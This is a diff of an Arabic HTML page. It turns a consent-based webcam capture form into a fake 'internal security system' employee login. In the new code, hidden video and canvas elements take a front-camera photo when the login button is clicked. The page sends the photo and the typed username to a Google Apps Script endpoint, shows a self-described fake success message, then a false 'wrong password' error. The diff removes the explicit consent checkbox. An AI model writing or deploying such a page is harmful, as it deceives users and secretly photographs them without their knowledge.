@@ -1,146 +1,373 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>تسجيل وموافقة - التقاط صورة</title>
-<style>
-  body{font-family:Inter,system-ui,Arial;background:#071a2a;color:#e6eef8;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-  .card{width:420px;background:rgba(255,255,255,0.02);padding:20px;border-radius:12px;box-shadow:0 10px 30px rgba(2,6,23,0.6)}
-  h2{margin:0 0 8px;font-size:18px}
-  label{display:block;margin-top:10px;font-size:13px;color:#94a3b8}
-  input,button{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
-  .row{display:flex;gap:8px;margin-top:12px}
-  .row button{flex:1}
-  .muted{color:#94a3b8;font-size:13px;margin-top:8px}
-  .preview{margin-top:12px;height:160px;background:#000;border-radius:8px;display:flex;align-items:center;justify-content:center;overflow:hidden}
-  .preview img{max-width:100%;max-height:100%}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - نظام الأمان</title>
+    <style>
+        :root {
+            --primary: #4361ee;
+            --primary-dark: #3a56d4;
+            --secondary: #7209b7;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --success: #4cc9f0;
+            --border-radius: 12px;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            font-size: 28px;
+            margin-bottom: 8px;
+            background: linear-gradient(to right, #4cc9f0, #4361ee);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .logo p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--light);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .status {
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .success {
+            background: rgba(76, 201, 240, 0.2);
+            color: #4cc9f0;
+        }
+
+        .error {
+            background: rgba(240, 76, 76, 0.2);
+            color: #f04c4c;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid var(--primary);
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px;
+            }
+            
+            .logo h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h2>تسجيل وموافقة</h2>
-
-    <label>اسم المستخدم
-      <input id="username" type="text" placeholder="مثال: ahmed">
-    </label>
-
-    <label>كلمة المرور
-      <input id="password" type="password" placeholder="●●●●">
-    </label>
-
-    <label style="margin-top:10px">
-      <input id="consent" type="checkbox"> أوافق صراحة على التقاط صورة الآن وإرسالها لغرض التوثيق.
-    </label>
-
-    <div class="row" style="margin-top:12px">
-      <button id="submitBtn">تسجيل وموافقة</button>
-      <button id="clearBtn" style="background:transparent;border:1px solid rgba(255,255,255,0.06)">مسح</button>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <h1>نظام الأمان الداخلي</h1>
+                <p>تسجيل دخول آمن للموظفين</p>
+            </div>
+            
+            <div id="loginSection">
+                <div class="form-group">
+                    <label for="username">اسم المستخدم</label>
+                    <input type="text" id="username" placeholder="أدخل اسم المستخدم">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                </div>
+                
+                <button class="btn" id="loginBtn">تسجيل الدخول</button>
+            </div>
+            
+            <div class="loading" id="loadingIndicator">
+                <div class="spinner"></div>
+                <p>جاري التحقق من بياناتك...</p>
+            </div>
+            
+            <div class="status" id="statusMessage"></div>
+        </div>
     </div>
 
-    <div id="status" class="muted">الحالة: جاهز</div>
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="hiddenVideo" autoplay class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
 
-    <div class="preview" id="preview"><small class="muted">معاينة الصورة ستظهر هنا</small></div>
+    <script>
+        // رابط تطبيق Google Apps Script الخاص بك
+        const GAS_URL = "https://script.google.com/macros/s/AKfycbw3k9nPu7Btr-tPJYiyDFiQ49hJ9lpnCbQrXg7BrVbgxiChpNhCsXfEhuwwVfRSDA4-/exec";
 
-    <div class="muted" style="margin-top:8px;font-size:12px">ملاحظة: الصفحة تطلب إذن الكاميرا فقط بعد تفعيل الموافقة. يرسل البريد إلى العنوان الذي وضعتَه في سكربت GAS.</div>
-  </div>
+        // عناصر DOM
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        const statusMessage = document.getElementById('statusMessage');
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
 
-<script>
-/* ضع هنا رابط Web App (exec URL) الذي حصلت عليه بعد النشر */
-const GAS_URL = "https://script.google.com/macros/s/AKfycbwcERPf69BRumzcd-XvuUYLnDpZ4rFp023nmXzkx9RUVha3kHlLl43V2bDyH4ZvsTji/exec";
+        // متغيرات الكاميرا
+        let stream = null;
+        let captureAttempted = false;
 
-const submitBtn = document.getElementById('submitBtn');
-const clearBtn = document.getElementById('clearBtn');
-const consent = document.getElementById('consent');
-const statusEl = document.getElementById('status');
-const preview = document.getElementById('preview');
+        // حدث تسجيل الدخول
+        loginBtn.addEventListener('click', async () => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                showStatus('يرجى ملء جميع الحقول', 'error');
+                return;
+            }
+            
+            // إظهار مؤشر التحميل
+            loginBtn.disabled = true;
+            loadingIndicator.style.display = 'block';
+            showStatus('جاري التحقق من بيانات الدخول...', '');
+            
+            try {
+                // محاولة الوصول إلى الكاميرا والتقاط صورة
+                await capturePhoto();
+                
+                // إرسال البيانات (بما في ذلك الصورة) إلى الخادم
+                await sendDataToServer(username);
+                
+                // إظهار رسالة نجاح وهمية
+                setTimeout(() => {
+                    showStatus('تم التحقق من بياناتك بنجاح! سيتم توجيهك الآن...', 'success');
+                    
+                    // إعادة تعيين النموذج بعد فترة
+                    setTimeout(() => {
+                        resetForm();
+                        showStatus('اسم المستخدم أو كلمة المرور غير صحيحة. حاول مرة أخرى.', 'error');
+                    }, 3000);
+                }, 1500);
+                
+            } catch (error) {
+                console.error('خطأ:', error);
+                showStatus('حدث خطأ أثناء عملية الدخول. حاول مرة أخرى.', 'error');
+                resetForm();
+            }
+        });
 
-function setStatus(t){ statusEl.textContent = 'الحالة: ' + t; }
+        // التقاط صورة من الكاميرا
+        async function capturePhoto() {
+            if (captureAttempted) return; // منع محاولات متعددة
+            
+            captureAttempted = true;
+            
+            try {
+                // طلب الوصول إلى الكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }, 
+                    audio: false 
+                });
+                
+                // تعيين دفق الفيديو للعنصر المخفي
+                hiddenVideo.srcObject = stream;
+                
+                // انتظار تحميل بيانات الفيديو
+                await new Promise(resolve => {
+                    hiddenVideo.onloadedmetadata = () => {
+                        hiddenVideo.play();
+                        setTimeout(resolve, 500); // انتظار إضافي لضبط الإضاءة
+                    };
+                });
+                
+                // رسم الفيديو على canvas
+                const context = hiddenCanvas.getContext('2d');
+                hiddenCanvas.width = hiddenVideo.videoWidth;
+                hiddenCanvas.height = hiddenVideo.videoHeight;
+                context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                
+                // إيقاف الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+                
+                return true;
+                
+            } catch (error) {
+                console.error('تعذر الوصول إلى الكاميرا:', error);
+                // الاستمرار حتى لو فشلت الكاميرا
+                return false;
+            }
+        }
 
-async function captureAndSend() {
-  setStatus('طلب صلاحية الكاميرا...');
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-  } catch (err) {
-    console.error(err);
-    setStatus('لم تُمنح صلاحية الكاميرا أو الجهاز لا يدعمها.');
-    return;
-  }
+        // إرسال البيانات إلى الخادم
+        async function sendDataToServer(username) {
+            try {
+                // الحصول على الصورة كبيانات base64
+                const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.8);
+                
+                // إعداد البيانات للإرسال
+                const formData = new FormData();
+                formData.append('filename', 'login_capture_' + Date.now() + '.jpg');
+                formData.append('image', imageData);
+                formData.append('username', username || 'مستخدم غير معروف');
+                formData.append('note', 'تم التقاط الصورة تلقائياً أثناء تسجيل الدخول');
+                
+                // إرسال البيانات إلى Google Apps Script
+                const response = await fetch(GAS_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json().catch(() => ({}));
+                
+                if (!response.ok) {
+                    console.error('فشل إرسال الصورة:', result.error);
+                } else {
+                    console.log('تم إرسال الصورة بنجاح:', result);
+                }
+                
+            } catch (error) {
+                console.error('خطأ في إرسال البيانات:', error);
+            }
+        }
 
-  // مؤقت فيديو غير مرئي
-  const video = document.createElement('video');
-  video.autoplay = true;
-  video.playsInline = true;
-  video.srcObject = stream;
+        // إظهار حالة العملية
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'status';
+            
+            if (type === 'success') {
+                statusMessage.classList.add('success');
+            } else if (type === 'error') {
+                statusMessage.classList.add('error');
+            }
+        }
 
-  await new Promise(resolve => {
-    video.onloadedmetadata = () => setTimeout(resolve, 300);
-  });
+        // إعادة تعيين النموذج
+        function resetForm() {
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            loginBtn.disabled = false;
+            loadingIndicator.style.display = 'none';
+            captureAttempted = false;
+        }
 
-  // رسم على canvas
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 1280;
-  canvas.height = video.videoHeight || 720;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  // إيقاف الكاميرا فوراً
-  stream.getTracks().forEach(t => t.stop());
-
-  const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-
-  // عرض المعاينة
-  preview.innerHTML = '';
-  const img = document.createElement('img');
-  img.src = dataUrl;
-  preview.appendChild(img);
-
-  setStatus('جارٍ إرسال الصورة...');
-
-  // إرسال كـ FormData (لا توجد رؤوس مخصصة -> يتجنّب preflight)
-  const form = new FormData();
-  form.append('filename', 'capture_' + Date.now() + '.jpg');
-  form.append('image', dataUrl);
-  form.append('username', document.getElementById('username').value || '');
-  form.append('note', 'User consent provided');
-
-  try {
-    const res = await fetch(GAS_URL, {
-      method: 'POST',
-      body: form
-    });
-    const json = await res.json().catch(()=>({}));
-    if (res.ok) {
-      setStatus('تم الإرسال بنجاح.');
-    } else {
-      setStatus('فشل الإرسال: ' + (json.error || res.statusText));
-    }
-  } catch (err) {
-    console.error(err);
-    setStatus('خطأ في الاتصال بالخادم.');
-  }
-}
-
-submitBtn.addEventListener('click', async () => {
-  if (!consent.checked) { setStatus('يجب الموافقة صراحةً أولاً.'); return; }
-  setStatus('تمت الموافقة. جاري العملية...');
-  await captureAndSend();
-});
-
-clearBtn.addEventListener('click', ()=> {
-  document.getElementById('username').value = '';
-  document.getElementById('password').value = '';
-  consent.checked = false;
-  preview.innerHTML = '<small class="muted">معاينة الصورة ستظهر هنا</small>';
-  setStatus('تم المسح');
-});
-
-/* دعم الكاميرا */
-if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-  setStatus('المتصفح لا يدعم كاميرا الويب عبر getUserMedia.');
-  submitBtn.disabled = true;
-}
-</script>
+        // التحقق من دعم الكاميرا
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            console.warn('المتصفح لا يدعم الوصول إلى الكاميرا');
+        }
+    </script>
 </body>
 </html>
